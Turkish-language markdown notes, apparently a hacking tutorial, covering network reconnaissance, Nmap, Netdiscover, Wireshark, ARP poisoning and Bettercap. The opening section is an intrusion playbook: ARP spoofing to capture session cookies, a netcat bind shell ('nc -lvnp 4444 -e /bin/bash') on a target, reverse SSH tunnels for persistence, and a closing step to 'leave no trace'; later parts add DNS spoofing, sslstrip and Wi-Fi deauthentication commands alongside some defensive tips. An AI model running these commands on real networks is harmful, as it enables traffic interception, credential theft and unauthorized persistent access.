# 📌 1️⃣ Bağlantı Kontrolü & Ağ Bilgilerini Toplama
Öncelikle bağlandığınız ağın yapısını analiz etmek önemlidir.

### 🔹 Bağlantı Doğrulama:
```bash
ip a  # Linux'ta IP kontrolü
ifconfig  # Alternatif Linux komutu
ipconfig /all  # Windows'ta IP bilgisi
```

### 🔹 Ağ Geçidini ve DNS'yi Öğrenme:
```bash
route -n  # Linux
netstat -rn  # Alternatif
```
**Windows:**
```cmd
ipconfig /all
```

### 🔹 Bağlı Cihazları Görüntüleme (LAN Tarama):
```bash
arp -a  # Ağda bağlı cihazları listeleme
nmap -sn 192.168.1.0/24  # Tüm cihazları tarama
```
📌 **Nmap**, ağa bağlı cihazları ve açık portları tespit etmek için kullanılabilir.

---

# 📌 2️⃣ Ağ Trafiğini İzleme
Ağdan geçen verileri analiz etmek için **Wireshark** veya **tcpdump** gibi araçlar kullanılabilir.

### 🔹 Wireshark ile Trafik Analizi:
```bash
wireshark
```
📌 Özellikle **HTTP trafiğini**, **açık portları** ve **şifrelenmemiş verileri** analiz edebilirsiniz.

### 🔹 Tcpdump Kullanımı:
```bash
tcpdump -i wlan0
tcpdump -i wlan0 port 80  # Yalnızca HTTP trafiğini izle
tcpdump -i wlan0 -w capture.pcap  # Kayıt almak
```
📌 Eğer ağ **şifrelenmemişse**, kullanıcı giriş bilgileri gibi hassas verilere erişim olabilir.

---

# 📌 3️⃣ Ağ İçindeki Cihazlara Sızma (Lateral Movement)
Bağlı cihazlara erişmek için **SMB, SSH veya RDP** açıklarını değerlendirebilirsiniz.

### 🔹 Açık Portları Tespit Etme:
```bash
nmap -p- 192.168.1.1/24
```

### 🔹 SMB (Windows Dosya Paylaşımı) Taraması:
```bash
nmap --script smb-os-discovery -p 445 192.168.1.0/24
```

### 🔹 SSH ile Cihazlara Bağlanma (Eğer Açık İse):
```bash
ssh user@192.168.1.X
```

---

# 📌 4️⃣ Man-in-the-Middle (MitM) Saldırıları
Bağlı cihazların trafiğini yönlendirmek için **MitM saldırıları** uygulanabilir.

### 🔹 Ettercap ile MitM:
```bash
ettercap -T -q -i wlan0 -M arp // //  
```

### 🔹 ARP Spoofing:
```bash
arpspoof -i wlan0 -t 192.168.1.100 -r 192.168.1.1
```
📌 Bu teknikler ile **şifrelenmemiş trafiği dinleyebilir**, **oturum çerezlerini ele geçirebilir** veya **DNS sahtekarlığı** yapabilirsiniz.

---

# 📌 5️⃣ Kalıcılığı Sağlama (Persistent Access)
Bağlantıyı kaybetmemek için **backdoor** veya **VPN tünelleme** yöntemleri kullanılabilir.

### 🔹 SSH Tünelleme ile Kalıcı Bağlantı:
```bash
ssh -R 2222:localhost:22 user@remote-server
```

### 🔹 Netcat ile Geri Bağlantı Açma:
**Hedef makinede:**
```bash
nc -lvnp 4444 -e /bin/bash
```
📌 Bu yöntem, bir bağlantı koparsa tekrar erişim sağlamaya yardımcı olabilir.

---

# 📌 6️⃣ Ağ Üzerindeki Servisleri Kullanma
Bağlı olunan ağdaki internet bağlantısını kullanarak **gizliliği artırabilirsiniz**.

### 🔹 VPN Tünelleme:
```bash
openvpn --config myvpn.ovpn
```

### 🔹 Proxy Bağlantısı Kullanma:
```bash
proxychains nmap -sT 192.168.1.1
```

---

# 📌 Özet
✅ **Ağ bilgilerini ve cihazları öğren**  

✅ **Trafiği izle ve analiz et**  

✅ **Bağlı cihazları keşfet ve açıklarını bul**  

✅ **MitM saldırıları ile veri yakala**  

✅ **Kalıcılığı sağla ve iz bırakma**  



# 🛠️ Netdiscover Nedir?
Netdiscover, yerel ağdaki cihazları keşfetmek için kullanılan bir ARP tarama aracıdır. Özellikle kablosuz ağlarda pasif ve aktif keşif yapmak için kullanılır.

- Ağ taraması yaparak IP-MAC adreslerini listeler.
- DHCP sunucusu olmayan ağlarda manuel keşif için uygundur.
- ARP protokolünü kullanarak hızlı tarama yapar.
- Kablosuz ağlarda gizli cihazları bulmak için pasif modda çalışabilir.

---

## 📌 Netdiscover Kullanımı

### 🔹 Temel Kullanım
Yerel ağdaki cihazları otomatik keşfetmek için:

```bash
netdiscover
```
📌 Sonuçlar: IP adresi, MAC adresi ve cihazın üreticisini gösterir.

---

### 🔹 Belirli Bir IP Aralığını Tarama
Eğer belirli bir ağ bloğunu taramak istiyorsanız:

```bash
netdiscover -r 192.168.1.0/24
```
📌 Bu komut, `192.168.1.1 - 192.168.1.254` arasındaki cihazları tarar.

---

### 🔹 Aktif ve Pasif Tarama Modları

✅ **Aktif Mod (Standart Tarama)**:
```bash
netdiscover -i wlan0 -r 192.168.1.0/24
```
📌 `wlan0` arayüzünü kullanarak aktif tarama yapar.

✅ **Pasif Mod (Sessiz Tarama - IDS Tetiklemez)**:
```bash
netdiscover -p
```
📌 Ağa ARP isteği göndermeden mevcut trafiği analiz eder.

---

### 🔹 Belirli Bir Cihazı (IP) Tespit Etme
Eğer belirli bir IP adresinin MAC adresini ve üreticisini görmek isterseniz:

```bash
netdiscover -i eth0 -r 192.168.1.100
```
📌 Bu komut sadece `192.168.1.100` adresindeki cihazı gösterir.

---

## 📌 Özet
✅ Yerel ağdaki cihazları hızlıca keşfetmek için kullanılır.  
✅ Aktif ve pasif tarama modları ile çalışabilir.  
✅ IP-MAC eşleşmesini öğrenerek ağ analizi yapmaya yardımcı olur.



# 📌 Temel Nmap Kullanımı

## 🎯 1️⃣ Basit Port Tarama
Belirli bir IP veya alan adındaki açık portları tarar:

```bash
nmap 192.168.1.1
nmap example.com
```
📌 **Sonuçlar:** Açık portlar ve hangi servislerin çalıştığını gösterir.

---

## 🎯 2️⃣ Belirli Portları Tespit Etme
Sadece belirli portları taramak için:

```bash
nmap -p 22,80,443 192.168.1.1
```
📌 **Port 22 (SSH), 80 (HTTP) ve 443 (HTTPS) taranır.**

---

## 🎯 3️⃣ Tüm Portları Tarama (1-65535)
Tüm açık portları görmek için:

```bash
nmap -p- 192.168.1.1
```
📌 **Bu komut, TCP üzerinden tüm portları tarar.**

---

## 🎯 4️⃣ Servis ve Sürüm Bilgisi Öğrenme
Hangi servisin hangi sürümle çalıştığını görmek için:

```bash
nmap -sV 192.168.1.1
```
📌 **Sonuçlar:** Apache, OpenSSH, MySQL gibi servislerin versiyon bilgilerini gösterir.

---

## 🎯 5️⃣ İşletim Sistemi (OS) Tespiti
Hedef cihazın hangi işletim sistemini kullandığını öğrenmek için:

```bash
nmap -O 192.168.1.1
```
📌 **Bu komut, hedefin Linux, Windows veya macOS olup olmadığını tespit etmeye çalışır.**

---

## 🎯 6️⃣ Güvenlik Duvarı (Firewall) Tespiti
Eğer hedef sistemde bir güvenlik duvarı (IDS/IPS) varsa bunu tespit etmek için:

```bash
nmap -sA 192.168.1.1
```
📌 **Sonuçlar, güvenlik duvarının bağlantıları nasıl yönlendirdiğini gösterir.**

---

## 🎯 7️⃣ Ağdaki Tüm Cihazları Keşfetme (Ağ Haritası Çıkartma)
Yerel ağdaki tüm cihazları listelemek için:

```bash
nmap -sn 192.168.1.0/24
```
📌 **Bu komut, ağdaki tüm cihazları gösterir ancak port taraması yapmaz.**

---

## 🎯 8️⃣ Zafiyet Taraması (Vulnerability Scan)
Nmap’in betik motorunu kullanarak zafiyet taraması yapmak için:

```bash
nmap --script=vuln 192.168.1.1
```
📌 **Bu komut, hedef sistemde bilinen güvenlik açıklarını tespit etmeye çalışır.**


# 🔍 ARP (Address Resolution Protocol) Nedir?

ARP (Adres Çözümleme Protokolü), IP adreslerini MAC adreslerine çevirmek için kullanılan bir ağ protokolüdür.

📌 **Özetle:** Bir cihazın IP adresini biliyorsanız, o cihazın MAC adresini öğrenmek için ARP kullanılır.

---

## 🔹 ARP Nasıl Çalışır?
1️⃣ Bilgisayar, hedef cihazın MAC adresini bilmiyorsa, bir **ARP isteği (ARP Request)** gönderir.
2️⃣ Hedef cihaz, kendi MAC adresini **ARP yanıtı (ARP Reply)** olarak gönderir.
3️⃣ MAC adresi öğrenildikten sonra, cihaz iletişim kurmaya başlar.
4️⃣ Bu bilgiler, daha hızlı erişim için **ARP tablosuna** kaydedilir.

### 🔹 ARP İsteği ve Yanıtı Örneği:
- **Gönderen:** "192.168.1.10'un MAC adresi nedir?"
- **Yanıt:** "Ben 192.168.1.10, MAC adresim **AA:BB:CC:DD:EE:FF**"

---

## 🔹 ARP Komutları (Linux & Windows)

### 🔹 ARP Tablosunu Görüntüleme:
```bash
arp -a
```
📌 **Çıktı:** Ağdaki cihazların IP adresleri ve MAC adresleri listelenir.

### 🔹 Belirli Bir IP’nin MAC Adresini Öğrenme:
```bash
arp -a 192.168.1.1
```

### 🔹 Manuel ARP Girişi Ekleme:
```bash
arp -s 192.168.1.100 AA:BB:CC:DD:EE:FF
```
📌 **Bu komut, belirli bir IP'ye elle MAC adresi atamak için kullanılır.**

---

## 🔹 ARP Türleri

✔️ **Güvenli Kullanımlar:**
- Ağdaki cihazları tespit etme
- IP-MAC eşleşmelerini kontrol etme

⚠️ **Saldırı Amaçlı Kullanımlar (Tehlikeli & Yasadışıdır)**
- **ARP Spoofing / ARP Poisoning:** Sahte MAC adresleri ile ağ trafiğini manipüle etmek
- **Man-in-the-Middle (MITM) saldırıları:** Trafiği ele geçirerek veri çalmak

📌 **Özet:**
✅ ARP, IP adreslerini MAC adreslerine çeviren bir protokoldür.
✅ Ağ içindeki cihazların MAC adreslerini öğrenmek için kullanılır.
✅ ARP spoofing gibi saldırılar nedeniyle güvenlik riskleri taşır.

---

# 🔴 ARP Poisoning (ARP Zehirleme) Nedir?

ARP Poisoning (ARP Spoofing), ağdaki cihazları kandırarak sahte MAC adresleri ile yönlendirme yapan bir **Man-in-the-Middle (MITM)** saldırısıdır.

📌 **Özetle:** Bir saldırgan, hedef cihazları yanlış bir MAC adresine yönlendirerek ağ trafiğini ele geçirir.

---

## 🛠️ ARP Poisoning Nasıl Çalışır?
1️⃣ **Saldırgan, hedef cihaza sahte bir ARP yanıtı gönderir.**
   - "Ben yönlendiriciyim, MAC adresim şu" der.
2️⃣ **Hedef cihaz, sahte MAC adresini gerçek sanarak iletişimi saldırgana yollar.**
3️⃣ **Saldırgan, trafiği okuyarak değiştirebilir veya yönlendirebilir.**
4️⃣ **Ağ trafiği manipüle edilebilir, parolalar çalınabilir veya oturumlar ele geçirilebilir.**

📌 **MITM saldırılarında en çok kullanılan yöntemlerden biridir.**

---

## 🔍 ARP Poisoning Saldırısı Nasıl Yapılır?
⚠️ **UYARI:** Bu bilgiler yalnızca **eğitim ve etik hacking** amaçlıdır. Yetkisiz saldırılar yasadışıdır.

### 1️⃣ Ettercap veya arpspoof Aracıyla Ağ Zehirleme
Linux’ta ARP Poisoning için:
```bash
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
```
📌 **Bu komut, hedef cihazı (192.168.1.10) yönlendirici (192.168.1.1) yerine saldırgana yönlendirir.**

### 2️⃣ Wireshark ile Trafiği Dinleme
- **Saldırgan, ARP poisoning yaptıktan sonra Wireshark ile trafiği analiz edebilir.**

### 3️⃣ SSL Strip ile HTTPS Trafiğini HTTP'ye Dönüştürme
- **Parola ve giriş bilgilerini çalmak için saldırgan SSL Strip kullanabilir.**

---

# 🔒 ARP Poisoning’den Korunma Yöntemleri

✔️ **Static ARP Kullanımı:**
- **ARP girişlerini manuel olarak belirleyerek sahte yanıtları önleyebilirsiniz.**
```bash
arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF
```

✔️ **ARP İzleme Araçları Kullanımı (ARPwatch, XArp)**
- **Ağdaki ARP değişikliklerini izleyerek sahte girişleri tespit edebilirsiniz.**

✔️ **Port Security Kullanımı (Switch Düzeyinde Koruma)**
- **MAC adresi sahtekarlığını engelleyen güvenlik ayarlarını etkinleştirin.**

✔️ **VPN Kullanımı**
- **Trafiğinizi şifreleyerek saldırganın veri çalmasını önleyebilirsiniz.**

---

📌 **Özet**
✅ ARP Poisoning, ağ trafiğini ele geçirmek için kullanılan bir MITM saldırısıdır.
✅ Saldırgan, sahte MAC adresleriyle cihazları yönlendirerek veri trafiğini çalar.
✅ ARP Spoofing saldırılarından korunmak için **statik ARP, port security ve VPN** kullanılmalıdır.



# Wireshark Nedir?
Wireshark, ağ trafiğini analiz etmek ve paketleri detaylı incelemek için kullanılan açık kaynaklı bir ağ izleme (sniffing) aracıdır.

## 📌 Özetle:
- Ağdaki tüm paketleri yakalar ve analiz eder.
- Siber güvenlik uzmanları, ağ yöneticileri ve etik hackerlar tarafından kullanılır.
- Güvenlik açıklarını tespit etmek ve ağ sorunlarını gidermek için kullanılır.

## 🔹 Wireshark Ne İçin Kullanılır?
✅ Ağ trafiğini izlemek ve analiz etmek  
✅ Paketlerin içeriğini görmek (HTTP, TCP, UDP, DNS, ARP, ICMP vb.)  
✅ Zararlı yazılım veya şüpheli trafik tespiti  
✅ Ağ saldırılarını analiz etmek (MITM, ARP Spoofing, DoS, DDoS vb.)  
✅ Kapsamlı adli bilişim (forensics) çalışmaları yapmak  

## 🔹 Wireshark Nasıl Kurulur?
### ✅ Linux için:
```bash
sudo apt install wireshark  # Debian/Ubuntu
sudo yum install wireshark  # CentOS/RHEL
```

### ✅ Windows için:
Wireshark Resmi Sitesinden indirilebilir.

### ✅ MacOS için:
```bash
brew install wireshark
```

### 🚀 Kurulum sonrası:
Linux’ta Wireshark’ın root izni olmadan çalışması için:
```bash
sudo dpkg-reconfigure wireshark-common
sudo usermod -aG wireshark $USER
```
Terminali kapatıp açın ve `wireshark` yazarak başlatın.

## 🔹 Wireshark Kullanımı
1️⃣ Wireshark’ı açın ve bir ağ arayüzü seçin (Wi-Fi, Ethernet vb.)  
2️⃣ "Start" tuşuna basarak trafiği kaydetmeye başlayın.  
3️⃣ Filtre kullanarak belirli paketleri izleyin (örneğin, sadece HTTP paketleri).  
4️⃣ Detaylı analiz yapın ve paketleri inceleyin.  
5️⃣ Gerekirse pcap dosyası olarak kaydedin ve paylaşın.  

## 🔹 Wireshark Filtreleri
### 📌 Canlı Trafik Filtreleri

🔹 Belirli bir IP'yi filtreleme:
```bash
ip.addr == 192.168.1.10
```
🔹 Belirli bir portu filtreleme (örneğin HTTP - 80):
```bash
tcp.port == 80
```
🔹 Yalnızca TCP veya UDP trafiği görmek için:
```bash
tcp
udp
```
🔹 Belirli bir protokolü görmek için (Örneğin, sadece DNS):
```bash
dns
```
🔹 Sadece belirli bir MAC adresini izlemek:
```bash
eth.addr == 00:11:22:33:44:55
```

## 🔹 Wireshark ile Şifre Yakalama (HTTP Üzerinden)
⚠️ **UYARI:** Yetkisiz paket dinleme yasadışıdır!

1️⃣ HTTP trafiğini filtreleyin:
```bash
http
```
2️⃣ GET veya POST isteklerine bakın (parola girişleri burada olabilir).
3️⃣ "Follow TCP Stream" seçeneği ile tüm oturumları detaylı görün.
📌 **HTTPS kullanıldığında bu yöntem çalışmaz!** (SSL/TLS şifreleme nedeniyle).

## 🔹 Wireshark ile Ağ Saldırılarını Tespit Etme
### 📌 ARP Spoofing / MITM Saldırısı Tespiti
1️⃣ ARP zehirleme saldırısını tespit etmek için:
```bash
arp
```
2️⃣ Eğer aynı IP adresine sahip iki farklı MAC adresi görüyorsanız, saldırı olabilir!

### 📌 DDoS / SYN Flood Saldırısı Tespiti
1️⃣ Çok sayıda SYN paketi olup olmadığını kontrol edin:
```bash
tcp.flags.syn == 1 && tcp.flags.ack == 0
```
2️⃣ Eğer hedef cihaz sürekli SYN istekleri alıyor ancak ACK göndermiyorsa, SYN Flood saldırısı olabilir.

## 📌 Özet
✅ Wireshark, ağ trafiğini analiz etmek için kullanılan en güçlü araçlardan biridir.  
✅ Ağ yöneticileri, siber güvenlik uzmanları ve etik hackerlar için vazgeçilmezdir.  
✅ Ağ saldırılarını tespit etmek, zafiyetleri bulmak ve hata ayıklamak için kullanılır.  

# 🔴 Bettercap Nedir?
Bettercap, ağ güvenliği testleri, paket analizi, Man-in-the-Middle (MITM) saldırıları ve kablosuz ağ pentest işlemleri için kullanılan güçlü bir sızma testi aracıdır.

## 📌 Özetle:
- Ağ trafiğini analiz edebilir ve değiştirebilir.
- MITM saldırıları yapabilir (ARP Spoofing, DNS Spoofing vb.).
- Kablosuz ağları (Wi-Fi, Bluetooth, RF) pasif ve aktif olarak izleyebilir.
- Zayıf parolaları test etmek için kullanılabilir.

---

## 📌 Bettercap Nasıl Kurulur?

### ✅ Linux (Debian / Ubuntu) için:
```bash
sudo apt update && sudo apt install bettercap
```
### ✅ Arch Linux için:
```bash
sudo pacman -S bettercap
```
### ✅ MacOS için:
```bash
brew install bettercap
```
### ✅ Manuel Yükleme:
```bash
go install github.com/bettercap/bettercap@latest
```
📌 Kurulum sonrası `bettercap` komutuyla başlatabilirsiniz.

---

## 📌 Bettercap Kullanımı
Bettercap’ı başlatmak için:
```bash
sudo bettercap
```
Komut satırına girildiğinde, Bettercap kendi etkileşimli konsolunu açar. Buradan modülleri yönetebilirsiniz.

### 🔍 Önemli Bettercap Modülleri ve Kullanımı

#### 🔹 Ağ Arayüzünü Belirleme
```bash
set net.interface eth0
```

#### 🔹 Ağ Trafiğini Dinleme (Sniffing)
```bash
net.sniff on
```

#### 🔹 ARP Spoofing ile MITM Saldırısı
```bash
set arp.spoof.targets 192.168.1.10
arp.spoof on
```
📌 Hedef cihazı yönlendirerek trafiğini ele geçirir.

#### 🔹 DNS Spoofing (Yanıltma) Yapma
```bash
set dns.spoof.all true
set dns.spoof.domains example.com
set dns.spoof.address 192.168.1.100
dns.spoof on
```
📌 Hedef, `example.com` adresine gittiğinde sahte IP'ye yönlendirilir.

#### 🔹 HTTPS Trafiğini Manipüle Etme (HSTS Bypass)
```bash
https.proxy on
set https.proxy.sslstrip true
```
📌 SSL trafiğini HTTP’ye düşürerek şifreleri ele geçirebilir.

---

## 📌 Kablosuz Ağ Saldırıları

### 🔍 Wi-Fi Ağlarını Tarama
```bash
wifi.recon on
```

### 🔍 Wi-Fi Cihazlarını ve SSID’leri Görme
```bash
wifi.show
```

### 📡 Deauth Saldırısı Yapma
```bash
set wifi.deauth.ap <Hedef_BSSID>
set wifi.deauth.client <Hedef_MAC>
wifi.deauth on
```
📌 Hedef cihazları Wi-Fi’dan düşürmek için kullanılır.

---

## 🔒 Bettercap’e Karşı Savunma
✅ VPN Kullanarak Trafiği Şifreleme  
✅ Static ARP Tabloları Kullanma (ARP Spoofing’i Engellemek için)  
✅ HTTPS Kullanımı ve HSTS Aktif Tutma  
✅ Ağ İzleme Araçları (Wireshark, ARPwatch) ile Şüpheli Trafiği Tespit Etme  

---

## 📌 Özet
✅ Bettercap, siber güvenlik testleri ve MITM saldırıları için güçlü bir araçtır.  
✅ Ağ trafiğini analiz edebilir, değiştirebilir ve yönlendirebilir.  
✅ Kablosuz ağları izleyebilir ve güvenlik testleri yapabilir.  

DEVAMI VAR








